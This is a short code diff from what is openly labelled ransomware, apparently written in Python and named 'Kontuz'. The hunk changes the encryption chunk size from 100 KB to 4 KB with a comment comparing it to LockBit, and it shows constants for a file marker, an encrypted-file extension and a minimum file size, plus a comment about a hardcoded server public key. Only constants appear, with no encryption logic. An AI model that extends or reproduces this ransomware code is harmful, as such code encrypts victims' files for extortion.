@@ -34,7 +34,7 @@ from cryptography.hazmat.primitives import serialization, hashes, padding as sym
 # Constants
 MARKER = b"KONTUZ"     # Tag to identify files encrypted
 EXTENSION = ".kontuz"  # Extension of the encrypted files
-CHUNK_SIZE = 100_000   # Size encrypted blokc i.e. 100 KB
+CHUNK_SIZE = 4096      # Size encrypted block i.e. 4KB (like Lockbit)
 MIN_SIZE = 261         # Ignore smaller files
 
 # Server's public key (hardcoded in malware)
